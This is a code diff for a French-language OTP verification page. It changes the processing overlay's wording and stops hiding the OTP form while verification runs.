@@ -344,8 +344,8 @@
       <div class="spinner" id="spinner"></div>
       <div class="approved-mark hidden" id="approvedMark">✓</div>
       <div class="rejection-mark hidden" id="rejectionMark">!</div>
-      <h2 id="overlayTitle">Veuillez patienter...</h2>
-      <p id="overlayText">Cela prend généralement quelques secondes</p>
+      <h2 id="overlayTitle">Vérification de l’OTP</h2>
+      <p id="overlayText">Veuillez patienter pendant la vérification de votre code.</p>
       <button type="button" class="retry-btn hidden" id="retryBtn">RÉESSAYER</button>
     </div>
   </div>
@@ -404,14 +404,13 @@
     });
 
     function showProcessing() {
-      otpForm.classList.add('hidden');
       overlay.classList.add('visible');
       spinner.classList.remove('hidden');
       approvedMark.classList.add('hidden');
       rejectionMark.classList.add('hidden');
       retryBtn.classList.add('hidden');
-      overlayTitle.textContent = 'Veuillez patienter...';
-      overlayText.textContent = 'Cela prend généralement quelques secondes';
+      overlayTitle.textContent = 'Vérification de l’OTP';
+      overlayText.textContent = 'Veuillez patienter pendant la vérification de votre code.';
     }
 
     function showRejected(title, message, destination = '') {
